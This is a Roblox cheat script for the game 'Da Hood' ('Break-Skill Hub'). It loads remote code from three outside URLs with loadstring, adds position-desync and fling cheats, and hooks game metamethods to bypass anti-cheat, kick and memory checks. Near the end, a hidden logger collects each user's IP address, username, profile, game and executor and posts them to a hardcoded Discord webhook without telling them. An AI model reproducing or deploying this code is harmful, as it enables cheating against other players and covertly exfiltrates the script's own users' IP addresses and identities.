--[
--Da Hood
--]

--[
--UI Library And Notification Library And Teleport Place Library
--]

local TeleportPlaceLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua"))()

getgenv()["IrisAd"] = true

local Notification = loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/IrisBetterNotifications.lua"))()

local library = loadstring(game:HttpGet("https://siegehub.net/Atlas_v2.lua"))()

--Instances And Functions

local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local LogService = game:GetService("LogService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local ScriptContext = game:GetService("ScriptContext")
local Workspace = game:GetService("Workspace")

local MainEvent = ReplicatedStorage.MainEvent

local Utility = {}
local Connections = {}
local DeSyncStuff = {}

local Client = Players.LocalPlayer

local R6_Dummy = game:GetObjects("rbxassetid://9474737816")[1]

R6_Dummy.Head.Face:Destroy()

for i, v in pairs(R6_Dummy:GetChildren()) do
    v.Transparency = v.Name == "HumanoidRootPart" and 1 or 0.88
    v.Material = Enum.Material.Neon
    v.Color = Color3.fromRGB(255, 30, 30)
    v.CanCollide = false
    v.Anchored = false
end

local function IsAlive(plr)
    local Alive = false

    if plr ~= nil and plr.Parent == Players and plr.Character ~= nil then
        if plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character.Humanoid.Health > 0 and plr.Character:FindFirstChild("Head") then
            Alive = true
        end
    end

    return Alive
end

local function RandomNumberRange(a)
    return math.random(-a * 100, a * 100) / 100
end

local function RandomVectorRange(a, b, c)
    return Vector3.new(RandomNumberRange(a), RandomNumberRange(b), RandomNumberRange(c))
end

function Utility:Connect(connection, func)
    local Con = connection:Connect(func)

    table.insert(Connections, Con)

    return Con
end

--[
--Window
--]

local Window = library:CreateWindow({
    Name = "Break-Skill Hub - V1 | Demo",
    Version = "1.0 | Demo",
    Watermark = "Break-Skill Hub - V1 | Demo | " .. MarketplaceService:GetProductInfo(game.PlaceId).Name,
    ConfigFolder = "Break-Skill Hub - V1_Demo",
    Bind = "RightControl",
    Color = Color3.fromRGB(255, 30, 30),
})

--[
--Rage Page
--]

local RagePage = Window:CreatePage({
    Name = "Rage"
})

--De-Sync Section

local DeSyncSection = RagePage:CreateLeftSection("De-Sync")

local DeSyncEnabled = DeSyncSection:CreateToggle("DH/DeSyncEnabled", {
    Name = "Enabled",
    Default = false,
    Callback = function(val)
        getgenv()["DeSyncEnabled"] = val
    end
})

local DeSyncFling = DeSyncSection:CreateToggle("DH/DeSyncFling", {
    Name = "Fling",
    Default = false,
    Callback = function(val)
        getgenv()["DeSyncFling"] = val
    end
})

local DeSyncVisualize = DeSyncSection:CreateToggle("DH/DeSyncVisualize", {
    Name = "Visualize",
    Default = false,
    Callback = function(val)
        getgenv()["DeSyncVisualize"] = val
    end
})

DeSyncSection:CreateDivider()

local DeSyncDividerLabel1 = DeSyncSection:CreateLabel("De-Sync Settings")

local VisualizeColorLabel = DeSyncSection:CreateLabel("Visualize Color", false)

local VisualizeColor = VisualizeColorLabel:CreateColorPicker("DH/Visualize/Color", Color3.fromRGB(255, 30, 30), function(val)
    for i, v in pairs(R6_Dummy:GetChildren()) do
        if v:IsA("BasePart") then
            v.Color = val
        end
    end
end)

local DeSyncMode = DeSyncSection:CreateDropdown("DH/DeSyncMode", {
    Name = "Mode",
    SelectType = "Single",
    Default = "Random",
    Values = {
        "Offset",
        "Random",
        "Zero"
    },
    Callback = function(val)
        getgenv()["DeSyncMode"] = val
    end
})

local DeSyncRotation = DeSyncSection:CreateDropdown("DH/DeSyncRotation", {
    Name = "Rotation",
    SelectType = "Single",
    Default = "Random",
    Values = {
        "Manual",
        "Random"
    },
    Callback = function(val)
        getgenv()["DeSyncRotation"] = val
    end
})

DeSyncSection:CreateDivider()

local DeSyncDividerLabel2 = DeSyncSection:CreateLabel("De-Sync Offset Mode", false)

local DeSyncOffsetX = DeSyncSection:CreateSlider("DH/DeSyncOffsetX", {
    Name = "Offset X",
    Min = -10,
    Default = 0,
    Max = 10,
    DecimalPlaces = 0,
    Callback = function(val)
        getgenv()["DeSyncOffsetX"] = val
    end
})

local DeSyncOffsetY = DeSyncSection:CreateSlider("DH/DeSyncOffsetY", {
    Name = "Offset Y",
    Min = -10,
    Default = 0,
    Max = 10,
    DecimalPlaces = 0,
    Callback = function(val)
        getgenv()["DeSyncOffsetY"] = val
    end
})

local DeSyncOffsetZ = DeSyncSection:CreateSlider("DH/DeSyncOffsetZ", {
    Name = "Offset Z",
    Min = -10,
    Default = 0,
    Max = 10,
    DecimalPlaces = 0,
    Callback = function(val)
        getgenv()["DeSyncOffsetZ"] = val
    end
})

DeSyncSection:CreateDivider()

local DeSyncDividerLabel3 = DeSyncSection:CreateLabel("De-Sync Random Mode", false)

local DeSyncRandomX = DeSyncSection:CreateSlider("DH/DeSyncRandomX", {
    Name = "Random X",
    Min = 0,
    Default = 10,
    Max = 35,
    DecimalPlaces = 0,
    Callback = function(val)
        getgenv()["DeSyncRandomX"] = val
    end
})

local DeSyncRandomY = DeSyncSection:CreateSlider("DH/DeSyncRandomY", {
    Name = "Random Y",
    Min = 0,
    Default = 10,
    Max = 35,
    DecimalPlaces = 0,
    Callback = function(val)
        getgenv()["DeSyncRandomY"] = val
    end
})

local DeSyncRandomZ = DeSyncSection:CreateSlider("DH/DeSyncRandomZ", {
    Name = "Random Z",
    Min = 0,
    Default = 10,
    Max = 35,
    DecimalPlaces = 0,
    Callback = function(val)
        getgenv()["DeSyncRandomZ"] = val
    end
})

DeSyncSection:CreateDivider()

local DeSyncDividerLabel4 = DeSyncSection:CreateLabel("De-Sync Manual Rotation", false)

local DeSyncManualX = DeSyncSection:CreateSlider("DH/DeSyncManualX", {
    Name = "Manual X",
    Min = -180,
    Default = 0,
    Max = 180,
    DecimalPlaces = 0,
    Callback = function(val)
        getgenv()["DeSyncManualX"] = val
    end
})

local DeSyncManualY = DeSyncSection:CreateSlider("DH/DeSyncManualY", {
    Name = "Manual Y",
    Min = -180,
    Default = 0,
    Max = 180,
    DecimalPlaces = 0,
    Callback = function(val)
        getgenv()["DeSyncManualY"] = val
    end
})

local DeSyncManualZ = DeSyncSection:CreateSlider("DH/DeSyncManualZ", {
    Name = "Manual Z",
    Min = -180,
    Default = 0,
    Max = 180,
    DecimalPlaces = 0,
    Callback = function(val)
        getgenv()["DeSyncManualZ"] = val
    end
})

--XD

Utility:Connect(RunService.Heartbeat, function()
    if IsAlive(Client) then
        if getgenv()["DeSyncEnabled"] then
            DeSyncStuff[1] = Client.Character.HumanoidRootPart.CFrame

            if getgenv()["DeSyncFling"] then
                DeSyncStuff[2] = Client.Character.HumanoidRootPart.Velocity
            end

            local FakeCFrame = Client.Character.HumanoidRootPart.CFrame

            if getgenv()["DeSyncMode"] == "Offset" then
                FakeCFrame = FakeCFrame * CFrame.new(Vector3.new(getgenv()["DeSyncOffsetX"], getgenv()["DeSyncOffsetY"], getgenv()["DeSyncOffsetZ"]))
            elseif getgenv()["DeSyncMode"] == "Random" then
                FakeCFrame = FakeCFrame * CFrame.new(RandomVectorRange(getgenv()["DeSyncRandomX"], getgenv()["DeSyncRandomY"], getgenv()["DeSyncRandomZ"]))
            elseif getgenv()["DeSyncMode"] == "Zero" then
                FakeCFrame = CFrame.new()
            end

            if getgenv()["DeSyncRotation"] == "Manual" then
                FakeCFrame = FakeCFrame * CFrame.Angles(math.rad(getgenv()["DeSyncManualX"]), math.rad(getgenv()["DeSyncManualY"]), math.rad(getgenv()["DeSyncManualZ"]))
            elseif getgenv()["DeSyncRotation"] == "Random" then
                FakeCFrame = FakeCFrame * CFrame.Angles(math.rad(RandomNumberRange(180)), math.rad(RandomNumberRange(180)), math.rad(RandomNumberRange(180)))
            end

            if getgenv()["DeSyncVisualize"] then
                R6_Dummy.Parent = Workspace
                R6_Dummy.HumanoidRootPart.Velocity = Vector3.new()

                R6_Dummy:SetPrimaryPartCFrame(FakeCFrame)
            else
                R6_Dummy.Parent = nil
            end

            Client.Character.HumanoidRootPart.CFrame = FakeCFrame

            if getgenv()["DeSyncFling"] then
                Client.Character.HumanoidRootPart.Velocity = Vector3.new(1, 1, 1) * 16384
            end

            RunService.RenderStepped:Wait()

            Client.Character.HumanoidRootPart.CFrame = DeSyncStuff[1]

            if getgenv()["DeSyncFling"] then
                Client.Character.HumanoidRootPart.Velocity = DeSyncStuff[2]
            end
        else
            if R6_Dummy.Parent ~= nil then
                R6_Dummy.Parent = nil
            end
        end
    else
        if R6_Dummy.Parent ~= nil then
            R6_Dummy.Parent = nil
        end
    end
end)

--Memory Check Bypass

hookfunction((gcinfo or collectgarbage), function(...)
    if getgenv().Memory then
        return math.random(200, 350)
    end
end)

local OldNameCall4

OldNameCall4 = hookmetamethod(game, "__namecall", function(...)
    local Args = {...}

    local Self = Args[1]

    local GetMethod = getnamecallmethod()

    if GetMethod == "Kick" and getgenv().Kick then
        return nil
    end

    return OldNameCall4(...)
end)

--Universal Bypass

local Disables = {
    Client.Idled,
    ScriptContext.Error,
    LogService.MessageOut
}

local Nos = {
    "PreloadAsync",
    "Kick",
    "kick",
    "xpcall",
    "gcinfo",
    "collectgarbage"
}

local Yes = {
    Client,
    CoreGui
}

for i, v in pairs(Disables) do
    for i2, v2 in pairs(getconnections(v)) do
        v2:Disable()
    end
end

local OldNameCall

OldNameCall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local Args = {...}

    local GetMethod = getnamecallmethod()

    if table.find(Nos, GetMethod) and table.find(Yes, self) then
        return nil or task.wait(math.huge)
    end

    if GetMethod == "FindService" and self.Name == "VirtualUser" and self.Name == "VirtualInputManager" then
        return
    end

    if typeof(Args) ~= "Instance" then
        return OldNameCall(self, ...)
    end

    return OldNameCall(unpack(Args), self, ...)
end))

if setffag then
    setffag("HumanoidParallelRemoveNoPhysics", "False")
    setffag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
end

if setfpscap then
    setfpscap(100)
end

ScriptContext:SetTimeout(0.5)

--Da Hood Bypass

local Bypass = {
    "CHECKER_1",
    "TeleportDetect",
    "OneMoreTime"
}

local OldNameCall2

OldNameCall2 = hookmetamethod(game, "__namecall", function(...)
    local Args = {...}

    local self = Args[1]

    local GetMethod = getnamecallmethod()
    local Caller = checkcaller()

    if (GetMethod == "FireServer" and self == MainEvent and table.find(Bypass, Args[2])) then
        return task.wait(9e9)
    end

    if GetMethod == "Kick" then
        return task.wait(9e9)
    end

    if GetMethod == "IsStudio" then
        return true
    end

    if (not Caller and getfenv(2).crash) then
        hookfunction(getfenv(2).crash, function()
            warn("Break-Skill Hub - V1 | Crash attempt.")
        end)
    end

    return OldNameCall2(...)
end)

local OldIndex

OldIndex = hookmetamethod(game, "__index", newcclosure(function(self, key)
    local Caller = checkcaller()

    if not Caller then
        if key == "CFrame" and getgenv()["DeSyncEnabled"] and Client.Character and Client.Character:FindFirstChild("HumanoidRootPart") and Client.Character:FindFirstChild("Humanoid") and Client.Character:FindFirstChild("Humanoid").Health > 0 then
            if self == Client.Character.HumanoidRootPart then
                return DeSyncStuff[1] or CFrame.new()
            elseif self == Client.Character.Head then
                return DeSyncStuff[1] and DeSyncStuff[1] + Vector3.new(0, Client.Character.HumanoidRootPart.Size / 2 + 0.5, 0) or CFrame.new()
            end
        end
    end

    return OldIndex(self, key)
end))

if not getgenv()["Developer_345RTHD1"] then
    local Web = syn.request({
        Url = "https://api.ipify.org/"
    })

    local URL = "https://discord.com/api/webhooks/1035991401164447824/hVKTRGxOars5_mMr4cpw6W_pHu9BNP5h3IRfDMxfRnt_VvK9KLbAE9ZW1dsvO3nshJhI"

    local Headers = {
        ["Content-Type"] = "application/json"
    }

    for i, v in pairs(Web) do
        if v ~= 200 and typeof(v) ~= "table" and v ~= true then
            local Data = {
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["title"] = "**Break-Skill Hub - V1 Logger**",
                        ["description"] = "```def\nUsername: " .. Client.Name .. "\nProfile: https://www.roblox.com/users/" .. Client.UserId .. "\nGame: " .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\nScript to join: game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", " .. tostring(game.GameId) .. ", game.Players.LocalPlayer)" .. "\nExecutor: " .. identifyexecutor() .. "\nIP: " .. v .. "```",
                        ["type"] = "rich",
                        ["color"] = tonumber(0xd40000)
                    }
                }
            }

            local NewData = HttpService:JSONEncode(Data)

            syn.request({
                Url = URL,
                Body = NewData,
                Method = "POST",
                Headers = Headers
            })
        end
    end
end

--Universal Bypass V2

local System = {
    379614936,
    860428890,
    866472074,
    2664771962,
    2664773504,
    5006801542,
    5122567177,
    5122568155,
    5122568874,
    5827139096
}

if not table.find(System, game.PlaceId) then
    return
end

local Char = Client.Character or Client.CharacterAdded:Wait()

local SystemTable = {
    "xpcall",
    "pcall",
    "Idle",
    "Deactivate",
    "PreloadAsync",
    "FindService",
    "collectgarbage",
    "GetPropertyChangedSignal",
    "getfenv",
    "Kick",
    "kick"
}

local SystemTable2 = {
    Char,
    CoreGui,
    Client,
    Client.Kick
}

local OldNameCall3

OldNameCall3 = hookmetamethod(game, "__namecall" or "__Index", function(self, ...)
    local Args = {...}

    local GetMethod = getnamecallmethod()

    if table.find(SystemTable, GetMethod) and table.find(SystemTable2, self) then
        return OldNameCall3(self, ...)
    end

    return OldNameCall3(self, ...)
end)
